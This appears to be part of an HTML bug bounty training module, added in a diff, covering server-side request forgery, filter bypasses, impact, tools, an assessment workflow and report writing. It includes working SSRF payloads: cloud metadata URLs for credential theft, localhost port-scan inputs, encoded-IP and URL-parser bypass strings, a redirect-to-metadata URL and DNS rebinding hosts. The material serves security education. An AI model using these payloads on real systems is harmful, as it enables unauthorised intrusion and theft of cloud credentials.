+{"url": "<span class="str">http://169.254.169.254/metadata/instance?api-version=2021-02-01</span>"}
+<span class="comment"># Requires header: Metadata: true</span>
+
+<span class="comment"># DigitalOcean metadata</span>
+{"url": "<span class="str">http://169.254.169.254/metadata/v1/</span>"}
+            </div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">SSRF to Cloud Metadata = Critical Severity</div>
+                    <div class="callout-text">
+                        An SSRF that successfully reads cloud metadata credentials is almost universally
+                        rated as critical severity across all major bug bounty platforms. It provides the
+                        attacker with IAM credentials that can access S3 buckets, databases, secrets
+                        managers, and other cloud services. This single vulnerability class has produced
+                        some of the largest bounty payouts in history. If you find an SSRF vector, always
+                        test the cloud metadata endpoint first &mdash; it is the highest-impact target.
+                    </div>
+                </div>
+            </div>
+
+            <h3>Blind SSRF</h3>
+
+            <p>
+                In blind SSRF, the server makes the request but does not return the response content
+                to the attacker. The application may show a success/failure message or nothing at all.
+                Detection requires out-of-band techniques: point the SSRF at a server you control
+                (Burp Collaborator, interactsh, or a simple HTTP listener) and watch for incoming
+                requests. If a request arrives, the SSRF is confirmed even though you cannot read
+                the response.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Blind SSRF detection with Burp Collaborator</span>
+{"url": "<span class="str">http://YOUR-COLLABORATOR-ID.burpcollaborator.net</span>"}
+
+<span class="comment"># Blind SSRF detection with interactsh (free alternative)</span>
+$ <span class="kw">interactsh-client</span>
+<span class="comment"># Gives you a unique domain like abc123.interact.sh</span>
+{"url": "<span class="str">http://abc123.interact.sh</span>"}
+<span class="comment"># If DNS/HTTP callback received → blind SSRF confirmed</span>
+
+<span class="comment"># Blind SSRF for internal port scanning</span>
+<span class="comment"># Timing-based: measure response time for different ports</span>
+{"url": "<span class="str">http://127.0.0.1:22</span>"}    <span class="comment"># SSH — different response time if open vs closed</span>
+{"url": "<span class="str">http://127.0.0.1:3306</span>"}  <span class="comment"># MySQL</span>
+{"url": "<span class="str">http://127.0.0.1:5432</span>"}  <span class="comment"># PostgreSQL</span>
+{"url": "<span class="str">http://127.0.0.1:27017</span>"} <span class="comment"># MongoDB</span>
+            </div>
+
+            <h3>SSRF Filter Bypass Techniques</h3>
+
+            <p>
+                Most applications that accept URLs implement some form of SSRF protection: blocklists
+                for internal IP ranges, allowlists for specific domains, or URL parsing to reject
+                suspicious destinations. These filters are frequently bypassable.
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Alternative IP formats</strong> &mdash; The IP address 127.0.0.1 can be represented as <code style="color: #c084fc;">2130706433</code> (decimal), <code style="color: #c084fc;">0x7f000001</code> (hex), <code style="color: #c084fc;">0177.0.0.1</code> (octal), or <code style="color: #c084fc;">127.1</code> (abbreviated). Filters that check for "127.0.0.1" as a string miss all of these.</li>
+                <li><strong style="color: #c4a0d8;">IPv6 equivalents</strong> &mdash; <code style="color: #c084fc;">[::1]</code> is the IPv6 loopback, equivalent to 127.0.0.1. <code style="color: #c084fc;">[::ffff:127.0.0.1]</code> is the IPv4-mapped IPv6 address. Many filters only check IPv4.</li>
+                <li><strong style="color: #c4a0d8;">DNS rebinding</strong> &mdash; Register a domain that initially resolves to an allowed IP (passing the filter) but resolves to an internal IP on subsequent requests (when the server actually fetches it). Tools like <code style="color: #c084fc;">rbndr.us</code> automate this.</li>
+                <li><strong style="color: #c4a0d8;">Redirect-based bypass</strong> &mdash; Point the URL at a server you control that returns a 302 redirect to the internal target. The filter validates your external domain; the server follows the redirect to 127.0.0.1.</li>
+                <li><strong style="color: #c4a0d8;">URL parser confusion</strong> &mdash; Different URL parsers interpret ambiguous URLs differently. <code style="color: #c084fc;">http://evil.com@127.0.0.1</code> is parsed by some libraries as host=evil.com (passing the filter) but fetched as 127.0.0.1. Similarly, <code style="color: #c084fc;">http://127.0.0.1#@allowed.com</code> may confuse parsers that check the fragment.</li>
+                <li><strong style="color: #c4a0d8;">Enclosed alphanumerics</strong> &mdash; Unicode characters like <code style="color: #c084fc;">&#9461;</code> (circled A) or fullwidth characters can sometimes bypass string-matching filters while being normalized by the HTTP library.</li>
+            </ul>
+
+            <div class="code-block">
+<span class="comment"># IP address format bypasses for 127.0.0.1</span>
+<span class="str">http://2130706433/</span>                  <span class="comment"># Decimal</span>
+<span class="str">http://0x7f000001/</span>                  <span class="comment"># Hexadecimal</span>
+<span class="str">http://0177.0.0.1/</span>                  <span class="comment"># Octal</span>
+<span class="str">http://127.1/</span>                        <span class="comment"># Abbreviated</span>
+<span class="str">http://[::1]/</span>                        <span class="comment"># IPv6 loopback</span>
+<span class="str">http://[::ffff:127.0.0.1]/</span>           <span class="comment"># IPv4-mapped IPv6</span>
+<span class="str">http://0/</span>                             <span class="comment"># 0.0.0.0 — often resolves to localhost</span>
+
+<span class="comment"># Redirect-based bypass (your server returns 302 to internal target)</span>
+<span class="str">http://your-server.com/redirect?to=http://169.254.169.254/latest/meta-data/</span>
+
+<span class="comment"># URL parser confusion</span>
+<span class="str">http://allowed.com@127.0.0.1/</span>
+<span class="str">http://127.0.0.1%2523@allowed.com/</span>  <span class="comment"># Double-encoded #</span>
+
+<span class="comment"># DNS rebinding (domain resolves to internal IP on second lookup)</span>
+<span class="str">http://A.127.0.0.1.1p.rbndr.us/</span>     <span class="comment"># Alternates between IPs</span>
+            </div>
+
+            <h3>SSRF Impact Scenarios</h3>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128273;</div>
+                    <div class="concept-card-title">Credential Theft</div>
+                    <div class="concept-card-body">
+                        Access cloud metadata to steal IAM credentials, service account tokens, or
+                        instance identity documents. Enables lateral movement across cloud services.
+                    </div>
+                    <span class="concept-tag">Critical</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128421;</div>
+                    <div class="concept-card-title">Internal Port Scanning</div>
+                    <div class="concept-card-body">
+                        Map internal network services (databases, caches, admin panels) that are not
+                        accessible from the internet. Reveals the internal attack surface.
+                    </div>
+                    <span class="concept-tag">High</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128196;</div>
+                    <div class="concept-card-title">Internal Data Access</div>
+                    <div class="concept-card-body">
+                        Read files via file:// protocol (if supported), access internal APIs, read
+                        configuration endpoints, and retrieve data from internal dashboards.
+                    </div>
+                    <span class="concept-tag">High</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128163;</div>
+                    <div class="concept-card-title">Remote Code Execution</div>
+                    <div class="concept-card-body">
+                        Chain SSRF with vulnerable internal services: Redis (SLAVEOF command injection),
+                        Memcached, or internal admin panels with known RCE vulnerabilities.
+                    </div>
+                    <span class="concept-tag">Critical</span>
+                </div>
+            </div>
+
+            <h3>Tools for SSRF Testing</h3>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">Burp Collaborator</div>
+                    <div class="tool-role">Out-of-Band Detection</div>
+                    <div class="tool-desc">
+                        Provides unique domains/IPs that log all incoming DNS and HTTP requests. Essential
+                        for detecting blind SSRF where no response is returned to the attacker.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">interactsh</div>
+                    <div class="tool-role">Open-Source OOB Server</div>
+                    <div class="tool-desc">
+                        Free alternative to Burp Collaborator by ProjectDiscovery. Supports DNS, HTTP,
+                        SMTP, and other protocols. Self-hostable for maximum control.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">SSRFmap</div>
+                    <div class="tool-role">Python &middot; SSRF Exploitation</div>
+                    <div class="tool-desc">
+                        Automated SSRF exploitation framework. Supports multiple protocols and cloud
+                        providers. Includes modules for AWS, GCP, and internal service exploitation.
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">SSRF Hunting Checklist</div>
+                    <div class="callout-text">
+                        When testing for SSRF, look for any feature that fetches remote resources: URL
+                        previews, link unfurling, webhook endpoints, file import-by-URL, PDF/image
+                        generators, proxy endpoints, and integration callbacks. Test each with internal
+                        addresses (127.0.0.1, 169.254.169.254, 10.x.x.x), your Collaborator domain, and
+                        common bypass formats. Even if the application blocks direct internal access, test
+                        redirect-based and DNS rebinding bypasses before concluding SSRF is not exploitable.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 10: Putting It All Together -->
+    <div class="section" id="s8">
+        <div class="section-number">Section 10</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9878;</span>
+            Putting It All Together
+        </h2>
+        <div class="section-body">
+            <h3>The Web Vulnerability Assessment Workflow</h3>
+
+            <p>
+                A structured methodology prevents wasted effort and missed findings. This workflow
+                prioritizes the highest-impact vulnerability classes first:
+            </p>
+
+            <ol class="numbered-list">
+                <li><strong style="color: #c4a0d8;">Scope review and reconnaissance.</strong> Read the program policy, identify in-scope domains and assets, enumerate subdomains, and map the technology stack. Do not start testing until you understand the rules of engagement.</li>
+                <li><strong style="color: #c4a0d8;">Attack surface mapping.</strong> Spider/crawl the application, enumerate API endpoints, identify all input vectors, map authentication boundaries, and document user roles. Build your testing roadmap.</li>
+                <li><strong style="color: #c4a0d8;">Content discovery.</strong> Run ffuf or feroxbuster against the target with appropriate wordlists. Discover hidden directories, backup files, admin panels, and API documentation. This step frequently reveals the most impactful targets.</li>
+                <li><strong style="color: #c4a0d8;">Access control testing.</strong> Test every authenticated endpoint from both horizontal (same-level user) and vertical (lower-privilege user) perspectives. IDOR, privilege escalation, and missing function-level access control are high-value, scanner-resistant findings.</li>
+                <li><strong style="color: #c4a0d8;">Injection testing.</strong> Test all identified input vectors for SQLi, XSS, command injection, and SSTI. Start with detection payloads before escalating to extraction or execution proofs.</li>
+                <li><strong style="color: #c4a0d8;">Configuration review.</strong> Check security headers, TLS configuration, exposed admin panels, default credentials, verbose error messages, and cloud storage permissions.</li>
+                <li><strong style="color: #c4a0d8;">Cryptographic and data exposure review.</strong> Inspect API responses for over-exposed data, search JavaScript for hardcoded secrets, check for .git/.env exposure, and verify data is encrypted in transit.</li>
+                <li><strong style="color: #c4a0d8;">Chain and report.</strong> Review all findings for chaining opportunities. Write clear, reproducible reports with impact statements.</li>
+            </ol>
+
+            <h3>Impact vs Severity vs Likelihood</h3>
+
+            <p>
+                There are two valid testing strategies. The
+                <strong style="color: #c4a0d8;">high-impact approach</strong> focuses on finding a single
+                critical vulnerability &mdash; SSRF, SQLi, authentication bypass &mdash; that commands a
+                large payout. The <strong style="color: #c4a0d8;">low-hanging fruit approach</strong>
+                focuses on multiple medium-severity issues quickly. New hunters often find more success
+                with low-hanging fruit while building their methodology, then graduate to high-impact
+                hunting as their skills sharpen. Understanding the distinction between impact, severity,
+                and likelihood is key to both approaches.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128165;</div>
+                    <div class="concept-card-title">Impact</div>
+                    <div class="concept-card-body">
+                        Worst-case consequence: data breach, account takeover, financial loss. Programs
+                        pay based on demonstrated impact, not theoretical possibility.
+                    </div>
+                    <span class="concept-tag">What Happens</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128200;</div>
+                    <div class="concept-card-title">Severity</div>
+                    <div class="concept-card-body">
+                        CVSS or Critical/High/Medium/Low scale. Determines payout tier. Reflected XSS on a
+                        marketing page rates differently than stored XSS on a banking dashboard.
+                    </div>
+                    <span class="concept-tag">How Bad</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#127919;</div>
+                    <div class="concept-card-title">Likelihood</div>
+                    <div class="concept-card-body">
+                        A vulnerability requiring physical access or complex interaction scores lower than
+                        one exploitable with a single HTTP request. Affects triage decisions.
+                    </div>
+                    <span class="concept-tag">How Likely</span>
+                </div>
+            </div>
+
+            <h3>When to Report vs When to Chain</h3>
+
+            <p>
+                Report immediately when the finding is high-severity on its own (SQLi with data extraction,
+                authentication bypass, SSRF to cloud metadata). Attempt chaining when the finding alone is
+                low severity but could become high-impact when combined. For example: an open redirect (low)
+                chained with an OAuth misconfiguration (medium) produces an account takeover (critical). A
+                well-demonstrated chain is paid at or above the severity of the final impact, not the
+                severity of the individual components.
+            </p>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">A Well-Reported Medium Beats a Poorly Reported Critical</div>
+                    <div class="callout-text">
+                        The quality of your report directly determines the outcome. A medium-severity finding
+                        with clear reproduction steps, screenshots, HTTP request/response pairs, impact
+                        analysis, and remediation guidance will be triaged faster, disputed less, and often
+                        paid at the higher end of the tier. A critical finding submitted as "I found SQLi on
+                        login page" with no proof of concept will be deprioritized or rejected. Invest time
+                        in report quality &mdash; it is the single most underrated skill in bug bounty.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion Prompts -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    Which OWASP Top 10 category do you think is most commonly found in bug bounty programs? Consider the difference between what automated scanners detect versus what manual testers find. Does finding more of a common category lead to higher or lower payouts per report?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    How do you decide whether a finding is worth reporting immediately or if you should try to chain it for higher impact? Consider duplicate risk, time investment, and the possibility that individual findings may be patched before you complete the chain.
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    What security misconfigurations have you observed in applications you use daily? How would you responsibly communicate these findings to affected organizations when no formal bug bounty program exists?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered the OWASP Top 10 framework and its mapping to bug bounty priorities,
+                systematic attack surface mapping methodology, injection vulnerability classes including
+                SQLi, XSS, command injection, and SSTI, broken access control and IDOR testing,
+                security misconfiguration identification, directory and content discovery tooling,
+                cryptographic failures and data exposure patterns, WAF identification and bypass
+                techniques, server-side request forgery exploitation and filter evasion, and the
+                vulnerability assessment workflow from reconnaissance through reporting.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 03
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar — updates both the fixed top bar and the mini bar in the header
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // Section fade-in via IntersectionObserver — adds 'visible' class when section enters viewport
+    function initSectionAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    // Module completion — delegates to ModuleProgress if available, falls back gracefully
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-web-vulns', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
